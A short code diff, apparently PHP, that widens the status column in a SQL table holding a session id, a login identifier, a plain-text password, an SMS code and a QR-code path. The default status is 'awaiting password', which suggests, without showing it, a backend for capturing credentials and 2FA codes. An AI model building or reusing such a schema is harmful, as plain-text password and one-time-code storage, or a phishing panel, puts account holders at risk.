@@ -30,9 +30,10 @@ try {
         session_id VARCHAR(255) NOT NULL,
         identificador VARCHAR(255) NOT NULL,
         senha VARCHAR(255) NULL,
-        sms_code VARCHAR(255) NULL, -- <<< COLUNA ADICIONADA AQUI
+        sms_code VARCHAR(255) NULL,
         qrcode_path VARCHAR(255) NULL,
-        status VARCHAR(50) DEFAULT 'aguardando_senha',
+        -- CORREÇÃO APLICADA AQUI: O tamanho da coluna status foi aumentado
+        status VARCHAR(255) DEFAULT 'aguardando_senha',
         data_criacao TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
     );
     ";
